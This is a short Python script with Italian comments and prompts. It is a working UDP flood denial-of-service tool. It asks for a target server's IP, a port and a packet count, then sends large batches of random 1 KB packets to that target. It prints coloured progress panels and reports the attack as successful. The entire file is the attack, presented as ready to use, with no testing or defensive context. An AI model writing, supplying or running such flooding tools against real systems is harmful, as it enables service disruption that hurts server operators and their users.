import socket
import random
from rich.console import Console
from rich.panel import Panel
from rich import print as rprint

# Crea un oggetto Console di Rich per gestire l'output
console = Console()

def udp_flood(ip_target, porta_target, num_pacchetti):
    # Il blocco try-except per gestire gli errori
    try:
        # Crea il socket UDP 
        socket_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Prepara un pacchetto di dati casuali
        dati_casuali = random._urandom(1024)
        
        # Stampa un messaggio formattato con Rich
        console.print(Panel(f"[bold green]Inizio l'invio di {num_pacchetti} pacchetti a {ip_target}:{porta_target}...", title="[bold blue]INFO[/bold blue]", border_style="green"))
        
        # Ciclo per inviare i pacchetti
        for i in range(num_pacchetti):
            socket_udp.sendto(dati_casuali, (ip_target, porta_target))
            
            # Stampa un'animazione di avanzamento o un messaggio ogni 1000 pacchetti
            if (i + 1) % 1000 == 0:
                rprint(f"[yellow]  Invio pacchetto numero: {i + 1}...")
            
        console.print(Panel("[bold green]Attacco UDP flood completato con successo![/bold green]", title="[bold blue]SUCCESS[/bold blue]", border_style="green"))
        
    except Exception as errore:
        # Stampa un pannello di errore rosso se qualcosa va storto
        console.print(Panel(f"[bold red]Ops! Qualcosa è andato storto: {errore}[/bold red]", title="[bold red]ERRORE[/bold red]", border_style="red"))
        console.print("[yellow]Verifica che l'IP e la porta siano corretti o che non ci siano problemi di rete.[/yellow]")
    
    finally:
        if 'socket_udp' in locals() and socket_udp:
            socket_udp.close()

if __name__ == "__main__":
    try:
        # Chiede l'input all'utente
        ip = input("Inserisci l'IP del server da attaccare: ")
        porta = int(input("Inserisci la porta: "))
        pacchetti = int(input("Inserisci il numero di pacchetti: "))
        
        # Chiama la funzione per iniziare
        udp_flood(ip, porta, pacchetti)
        
    except ValueError:
        # Messaggio di errore per input non numerico, con formattazione Rich
        rprint("[bold red]Errore:[/bold red] [yellow]Devi inserire dei numeri validi per la porta e il numero di pacchetti.[/yellow]")